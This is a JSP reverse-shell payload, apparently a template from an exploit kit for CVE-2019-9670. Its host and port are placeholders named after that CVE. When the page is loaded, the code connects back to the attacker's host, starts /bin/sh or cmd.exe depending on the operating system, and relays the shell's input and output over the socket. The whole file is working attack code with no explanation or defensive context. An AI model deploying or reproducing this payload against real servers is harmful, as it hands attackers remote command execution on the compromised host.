<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream gd;
    OutputStream po;

    StreamConnector( InputStream gd, OutputStream po )
    {
      this.gd = gd;
      this.po = po;
    }

    public void run()
    {
      BufferedReader ry  = null;
      BufferedWriter mjl = null;
      try
      {
        ry  = new BufferedReader( new InputStreamReader( this.gd ) );
        mjl = new BufferedWriter( new OutputStreamWriter( this.po ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ry.read( buffer, 0, buffer.length ) ) > 0 )
        {
          mjl.write( buffer, 0, length );
          mjl.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ry != null )
          ry.close();
        if( mjl != null )
          mjl.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "LHOST_cve_2019_9670", LPORT_cve_2019_9670 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
